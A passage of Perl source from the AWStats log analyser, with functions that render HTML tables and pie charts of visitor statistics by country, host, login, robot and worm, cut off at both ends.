colspan=\\\"7\\\" align=\\\"center\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"AWStatsCountryMap\",              \"countries_map\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           \t\t\t0,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\t\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th width=\\\"$WIDTHCOLICON\\\">&nbsp;</th><th colspan=\\\"2\\\">$Message[17]</th>\";\n\n\t## to add unique visitors and number of visits by calculation of average of the relation with total\n\t## pages and total hits, and total visits and total unique\n\t## by Josep Ruano @ CAPSiDE\n\tif ( $ShowDomainsStats =~ /U/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_u\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(2)\n\t\t  . \">$Message[11]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /V/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_v\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(1)\n\t\t  . \">$Message[10]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /P/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(3)\n\t\t  . \">$Message[56]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /H/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(4)\n\t\t  . \">$Message[57]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(5)\n\t\t  . \">$Message[75]</th>\";\n\t}\n\tprint \"<th>&nbsp;</th>\";\n\tprint \"</tr>\\n\";\n\t\n\tforeach my $key (@keylist) {\n\t\tmy ( $_domener_u, $_domener_v );\n\t\tmy $bredde_p = 0;\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_k = 0;\n\t\tmy $bredde_u = 0;\n\t\tmy $bredde_v = 0;\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_p =\n\t\t\t  int( $BarWidth * $_domener_p{$key} / $max_h ) + 1;\n\t\t}    # use max_h to enable to compare pages with hits\n\t\tif ( $_domener_p{$key} && $bredde_p == 1 ) { $bredde_p = 2; }\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h =\n\t\t\t  int( $BarWidth * $_domener_h{$key} / $max_h ) + 1;\n\t\t}\n\t\tif ( $_domener_h{$key} && $bredde_h == 1 ) { $bredde_h = 2; }\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k =\n\t\t\t  int( $BarWidth * ( $_domener_k{$key} || 0 ) / $max_k ) +\n\t\t\t  1;\n\t\t}\n\t\tif ( $_domener_k{$key} && $bredde_k == 1 ) { $bredde_k = 2; }\n\t\tmy $newkey = lc($key);\n\t\tif ( $newkey eq 'ip' || !$DomainsHashIDLib{$newkey} ) {\n\t\t\tprint\n\"<tr><td width=\\\"$WIDTHCOLICON\\\"><img src=\\\"$DirIcons\\/flags\\/ip.png\\\" height=\\\"14\\\"\"\n\t\t\t  . AltTitle(\"$Message[0]\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$Message[0]</td><td>$newkey</td>\";\n\t\t}\n\t\telse {\n\t\t\tprint\n\"<tr><td width=\\\"$WIDTHCOLICON\\\"><img src=\\\"$DirIcons\\/flags\\/$newkey.png\\\" height=\\\"14\\\"\"\n\t\t\t  . AltTitle(\"$newkey\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$DomainsHashIDLib{$newkey}</td><td>$newkey</td>\";\n\t\t}\n\t\t## to add unique visitors and number of visits, by Josep Ruano @ CAPSiDE\n\t\tif ( $ShowDomainsStats =~ /U/i ) {\n\t\t\t$_domener_u = (\n\t\t\t\t  $_domener_p{$key}\n\t\t\t\t? $_domener_p{$key} / $TotalPages\n\t\t\t\t: 0\n\t\t\t);\n\t\t\t$_domener_u += ( $_domener_h{$key} / $TotalHits );\n\t\t\t$_domener_u =\n\t\t\t  sprintf( \"%.0f\", ( $_domener_u * $TotalUnique ) / 2 );\n\t\t\tprint \"<td>\".Format_Number($_domener_u).\" (\"\n\t\t\t  . sprintf( \"%.1f%\", 100 * $_domener_u / $TotalUnique )\n\t\t\t  . \")</td>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /V/i ) {\n\t\t\t$_domener_v = (\n\t\t\t\t  $_domener_p{$key}\n\t\t\t\t? $_domener_p{$key} / $TotalPages\n\t\t\t\t: 0\n\t\t\t);\n\t\t\t$_domener_v += ( $_domener_h{$key} / $TotalHits );\n\t\t\t$_domener_v =\n\t\t\t  sprintf( \"%.0f\", ( $_domener_v * $TotalVisits ) / 2 );\n\t\t\tprint \"<td>\".Format_Number($_domener_v).\" (\"\n\t\t\t  . sprintf( \"%.1f%\", 100 * $_domener_v / $TotalVisits )\n\t\t\t  . \")</td>\";\n\t\t}\n\n\t\tif ( $ShowDomainsStats =~ /P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_domener_p{$key} ? Format_Number($_domener_p{$key}) : '&nbsp;' )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_domener_h{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_domener_k{$key} ) . \"</td>\";\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">\";\n\n\t\tif ( $ShowDomainsStats =~ /P/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"5\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /><br />\\n\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /H/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hh'}\\\" width=\\\"$bredde_h\\\" height=\\\"5\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /><br />\\n\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hk'}\\\" width=\\\"$bredde_k\\\" height=\\\"5\\\"\"\n\t\t\t  . AltTitle(\"\") . \" />\";\n\t\t}\n\t\tprint \"</td>\";\n\t\tprint \"</tr>\\n\";\n\n\t\t$total_u += $_domener_u;\n\t\t$total_v += $_domener_v;\n\t\t$total_p += $_domener_p{$key};\n\t\t$total_h += $_domener_h{$key};\n\t\t$total_k += $_domener_k{$key} || 0;\n\t\t$count++;\n\t}\n\tmy $rest_u = $TotalUnique - $total_u;\n\tmy $rest_v = $TotalVisits - $total_v;\n\tmy $rest_p = $TotalPages - $total_p;\n\tmy $rest_h = $TotalHits - $total_h;\n\tmy $rest_k = $TotalBytes - $total_k;\n\tif (   $rest_u > 0\n\t\t|| $rest_v > 0\n\t\t|| $rest_p > 0\n\t\t|| $rest_h > 0\n\t\t|| $rest_k > 0 )\n\t{    # All other domains (known or not)\n\t\tprint\n\"<tr><td width=\\\"$WIDTHCOLICON\\\">&nbsp;</td><td colspan=\\\"2\\\" class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowDomainsStats =~ /U/i ) { print \"<td>$rest_u</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /V/i ) { print \"<td>$rest_v</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /P/i ) { print \"<td>$rest_p</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /H/i ) { print \"<td>$rest_h</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">&nbsp;</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the hosts chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainHosts{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowHostsStats\", 2 ); }\n\tprint \"$Center<a name=\\\"visitors\\\">&nbsp;</a><br />\\n\";\n\tmy $title =\n\"$Message[81] ($Message[77] $MaxNbOf{'HostsShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=allhosts\")\n\t\t: \"$StaticLinks.allhosts.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a> &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=lasthosts\")\n\t\t: \"$StaticLinks.lasthosts.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[9]</a> &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=unknownip\")\n\t\t: \"$StaticLinks.unknownip.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[45]</a>\";\n\t  \n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=VISITOR&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n\t  \n\t&tab_head( \"$title\", 19, 0, 'visitors' );\n\t\n\t&BuildKeyList( $MaxNbOf{'HostsShown'}, $MinHit{'Host'}, \\%_host_h,\n\t\t\\%_host_p );\n\t\t\n\t# Graph the top five in a pie chart\n\tif (scalar @keylist > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy @valcolor = ($color_p);\n\t\t\tmy $cnt = 0;\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\tpush @valdata, int( $_host_h{$key} / $TotalHits * 1000 ) / 10;\n\t\t\t\tpush @blocklabel, \"$key\";\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 4) { last; }\n\t\t\t}\n\t\t\tprint \"<tr><td colspan=\\\"7\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"Hosts\",              \"hosts\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           \t\t\t\\@valcolor,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\t\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\">\";\n\tprint \"<th>\";\n\tif ( $MonthRequired ne 'all' ) {\n\t\tprint\n\"$Message[81] : \".Format_Number($TotalHostsKnown).\" $Message[82], \".Format_Number($TotalHostsUnknown).\" $Message[1]<br />\".Format_Number($TotalUnique).\" $Message[11]</th>\";\n\t}\n\telse {\n\t\tprint \"$Message[81] : \" . ( scalar keys %_host_h ) . \"</th>\";\n\t}\n\t&HTMLShowHostInfo('__title__');\n\tif ( $ShowHostsStats =~ /P/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(3)\n\t\t  . \">$Message[56]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /H/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(4)\n\t\t  . \">$Message[57]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /B/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(5)\n\t\t  . \">$Message[75]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_p = my $total_h = my $total_k = 0;\n\tmy $count = 0;\n\t\n\tmy $regipv4 = qr/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$/;\t\n\n        if ( $DynamicDNSLookup == 2 ) {\n\t        # Use static DNS file\n                &Read_DNS_Cache( \\%MyDNSTable, \"$DNSStaticCacheFile\", \"\", 1 );\n        }\n\n\tforeach my $key (@keylist) {\n\t\tprint \"<tr>\";\n\t\tprint \"<td class=\\\"aws\\\">$key\";\n\n\t\tif ($DynamicDNSLookup) {\n\t                # Dynamic reverse DNS lookup\n\t                if ($key =~ /$regipv4/o) {\n\t\t                my $lookupresult=lc(gethostbyaddr(pack(\"C4\",split(/\\./,$key)),AF_INET));\t# This may be slow\n                \t        if (! $lookupresult || $lookupresult =~ /$regipv4/o || ! IsAscii($lookupresult)) {\n                                        if ( $DynamicDNSLookup == 2 ) {\n                                                # Check static DNS file\n                                                $lookupresult = $MyDNSTable{$key};\n                                                if ($lookupresult) { print \" ($lookupresult)\"; }\n                                                else { print \"\"; }\n                                        }\n                                        else { print \"\"; }\n                                }\n                                else { print \" ($lookupresult)\"; }\n                        }\n                }\n\n\t\tprint \"</td>\";\n\t\t&HTMLShowHostInfo($key);\n\t\tif ( $ShowHostsStats =~ /P/i ) {\n\t\t\tprint '<td>' . ( Format_Number($_host_p{$key}) || \"&nbsp;\" ) . '</td>';\n\t\t}\n\t\tif ( $ShowHostsStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_host_h{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /B/i ) {\n\t\t\tprint '<td>' . Format_Bytes( $_host_k{$key} ) . '</td>';\n\t\t}\n\t\tif ( $ShowHostsStats =~ /L/i ) {\n\t\t\tprint '<td nowrap=\"nowrap\">'\n\t\t\t  . (\n\t\t\t\t$_host_l{$key}\n\t\t\t\t? Format_Date( $_host_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . '</td>';\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$total_p += $_host_p{$key};\n\t\t$total_h += $_host_h{$key};\n\t\t$total_k += $_host_k{$key} || 0;\n\t\t$count++;\n\t}\n\tmy $rest_p = $TotalPages - $total_p;\n\tmy $rest_h = $TotalHits - $total_h;\n\tmy $rest_k = $TotalBytes - $total_k;\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )\n\t{    # All other visitors (known or not)\n\t\tprint \"<tr>\";\n\t\tprint\n\"<td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\t&HTMLShowHostInfo('');\n\t\tif ( $ShowHostsStats =~ /P/i ) { print \"<td>\".Format_Number($rest_p).\"</td>\"; }\n\t\tif ( $ShowHostsStats =~ /H/i ) { print \"<td>\".Format_Number($rest_h).\"</td>\"; }\n\t\tif ( $ShowHostsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the logins chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainLogins{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowAuthenticatedUsers\", 2 ); }\n\tprint \"$Center<a name=\\\"logins\\\">&nbsp;</a><br />\\n\";\n\tmy $title =\n\"$Message[94] ($Message[77] $MaxNbOf{'LoginShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=alllogins\")\n\t\t: \"$StaticLinks.alllogins.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\";\n\tif ( $ShowAuthenticatedUsers =~ /L/i ) {\n\t\t$title .= \" &nbsp; - &nbsp; <a href=\\\"\"\n\t\t  . (\n\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t  || !$StaticLinks\n\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=lastlogins\")\n\t\t\t: \"$StaticLinks.lastlogins.$StaticExt\"\n\t\t  )\n\t\t  . \"\\\"$NewLinkTarget>$Message[9]</a>\";\n\t}\n\t&tab_head( \"$title\", 19, 0, 'logins' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>$Message[94] : \"\n\t  . Format_Number(( scalar keys %_login_h )) . \"</th>\";\n\t&HTMLShowUserInfo('__title__');\n\tif ( $ShowAuthenticatedUsers =~ /P/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(3)\n\t\t  . \">$Message[56]</th>\";\n\t}\n\tif ( $ShowAuthenticatedUsers =~ /H/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(4)\n\t\t  . \">$Message[57]</th>\";\n\t}\n\tif ( $ShowAuthenticatedUsers =~ /B/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(5)\n\t\t  . \">$Message[75]</th>\";\n\t}\n\tif ( $ShowAuthenticatedUsers =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_p = my $total_h = my $total_k = 0;\n\tmy $max_h = 1;\n\tforeach ( values %_login_h ) {\n\t\tif ( $_ > $max_h ) { $max_h = $_; }\n\t}\n\tmy $max_k = 1;\n\tforeach ( values %_login_k ) {\n\t\tif ( $_ > $max_k ) { $max_k = $_; }\n\t}\n\tmy $count = 0;\n\t&BuildKeyList( $MaxNbOf{'LoginShown'}, $MinHit{'Login'}, \\%_login_h,\n\t\t\\%_login_p );\n\tforeach my $key (@keylist) {\n\t\tmy $bredde_p = 0;\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_k = 0;\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_p = int( $BarWidth * $_login_p{$key} / $max_h ) + 1;\n\t\t}    # use max_h to enable to compare pages with hits\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h = int( $BarWidth * $_login_h{$key} / $max_h ) + 1;\n\t\t}\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k = int( $BarWidth * $_login_k{$key} / $max_k ) + 1;\n\t\t}\n\t\tprint \"<tr><td class=\\\"aws\\\">$key</td>\";\n\t\t&HTMLShowUserInfo($key);\n\t\tif ( $ShowAuthenticatedUsers =~ /P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_login_p{$key} ? Format_Number($_login_p{$key}) : \"&nbsp;\" )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_login_h{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_login_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_login_l{$key}\n\t\t\t\t? Format_Date( $_login_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$total_p += $_login_p{$key};\n\t\t$total_h += $_login_h{$key};\n\t\t$total_k += $_login_k{$key};\n\t\t$count++;\n\t}\n\tmy $rest_p = $TotalPages - $total_p;\n\tmy $rest_h = $TotalHits - $total_h;\n\tmy $rest_k = $TotalBytes - $total_k;\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )\n\t{    # All other logins\n\t\tprint\n\t\t  \"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">\"\n\t\t  . ( $PageDir eq 'rtl' ? \"<span dir=\\\"ltr\\\">\" : \"\" )\n\t\t  . \"$Message[125]\"\n\t\t  . ( $PageDir eq 'rtl' ? \"</span>\" : \"\" )\n\t\t  . \"</span></td>\";\n\t\t&HTMLShowUserInfo('');\n\t\tif ( $ShowAuthenticatedUsers =~ /P/i ) {\n\t\t\tprint \"<td>\" . ( $rest_p ? Format_Number($rest_p) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($rest_h).\"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /L/i ) {\n\t\t\tprint \"<td>&nbsp;</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the robots chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainRobots{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowRobotStats\", 2 ); }\n\tprint \"$Center<a name=\\\"robots\\\">&nbsp;</a><br />\\n\";\n\n\tmy $title = \"$Message[53] ($Message[77] $MaxNbOf{'RobotShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t\t  . (\n\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t  || !$StaticLinks\n\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=allrobots\")\n\t\t\t: \"$StaticLinks.allrobots.$StaticExt\"\n\t\t  )\n\t\t  . \"\\\"$NewLinkTarget>$Message[80]</a> &nbsp; - &nbsp; <a href=\\\"\"\n\t\t  . (\n\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t  || !$StaticLinks\n\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=lastrobots\")\n\t\t\t: \"$StaticLinks.lastrobots.$StaticExt\"\n\t\t  )\n\t\t  . \"\\\"$NewLinkTarget>$Message[9]</a>\";\n\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=ROBOT&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \n    &tab_head( \"$title\", 19, 0, 'robots');\n        \n    print \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"\"\n\t  . Tooltip(16) . \"><th>\"\n\t  . Format_Number(( scalar keys %_robot_h ))\n\t  . \" $Message[51]*</th>\";\n\tif ( $ShowRobotsStats =~ /H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowRobotsStats =~ /B/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tif ( $ShowRobotsStats =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_p = my $total_h = my $total_k = my $total_r = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxNbOf{'RobotShown'}, $MinHit{'Robot'}, \\%_robot_h,\n\t\t\\%_robot_h );\n\tforeach my $key (@keylist) {\n\t\tprint \"<tr><td class=\\\"aws\\\">\"\n\t\t  . ( $PageDir eq 'rtl' ? \"<span dir=\\\"ltr\\\">\" : \"\" )\n\t\t  . ( $RobotsHashIDLib{$key} ? $RobotsHashIDLib{$key} : $key )\n\t\t  . ( $PageDir eq 'rtl' ? \"</span>\" : \"\" ) . \"</td>\";\n\t\tif ( $ShowRobotsStats =~ /H/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Number(( $_robot_h{$key} - $_robot_r{$key} ))\n\t\t\t  . ( $_robot_r{$key} ? \"+$_robot_r{$key}\" : \"\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowRobotsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_robot_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowRobotsStats =~ /L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_robot_l{$key}\n\t\t\t\t? Format_Date( $_robot_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t#$total_p += $_robot_p{$key};\n\t\t$total_h += $_robot_h{$key};\n\t\t$total_k += $_robot_k{$key} || 0;\n\t\t$total_r += $_robot_r{$key} || 0;\n\t\t$count++;\n\t}\n\n\t# For bots we need to count Totals\n\tmy $TotalPagesRobots =\n\t  0;    #foreach (values %_robot_p) { $TotalPagesRobots+=$_; }\n\tmy $TotalHitsRobots = 0;\n\tforeach ( values %_robot_h ) { $TotalHitsRobots += $_; }\n\tmy $TotalBytesRobots = 0;\n\tforeach ( values %_robot_k ) { $TotalBytesRobots += $_; }\n\tmy $TotalRRobots = 0;\n\tforeach ( values %_robot_r ) { $TotalRRobots += $_; }\n\tmy $rest_p = 0;    #$rest_p=$TotalPagesRobots-$total_p;\n\tmy $rest_h = $TotalHitsRobots - $total_h;\n\tmy $rest_k = $TotalBytesRobots - $total_k;\n\tmy $rest_r = $TotalRRobots - $total_r;\n\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 || $rest_r > 0 )\n\t{               # All other robots\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowRobotsStats =~ /H/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Number(( $rest_h - $rest_r ))\n\t\t\t  . ( $rest_r ? \"+$rest_r\" : \"\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowRobotsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . ( Format_Bytes($rest_k) ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowRobotsStats =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end(\n\t\t\"* $Message[156]\" . ( $TotalRRobots ? \" $Message[157]\" : \"\" ) );\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the worms chart and table\n# Parameters:   -\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainWorms{\n\tif ($Debug) { debug( \"ShowWormsStats\", 2 ); }\n\tprint \"$Center<a name=\\\"worms\\\">&nbsp;</a><br />\\n\";\n\t&tab_head( \"$Message[163] ($Message[77] $MaxNbOf{'WormsShown'})\",\n\t\t19, 0, 'worms' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"\" . Tooltip(21) . \">\";\n\tprint \"<th>\" . Format_Number(( scalar keys %_worm_h )) . \" $Message[164]*</th>\";\n\tprint \"<th>$Message[167]</th>\";\n\tif ( $ShowWormsStats =~ /H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowWormsStats =~ /B/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tif ( $ShowWormsStats =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_p = my $total_h = my $total_k = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxNbOf{'WormsShown'}, $MinHit{'Worm'}, 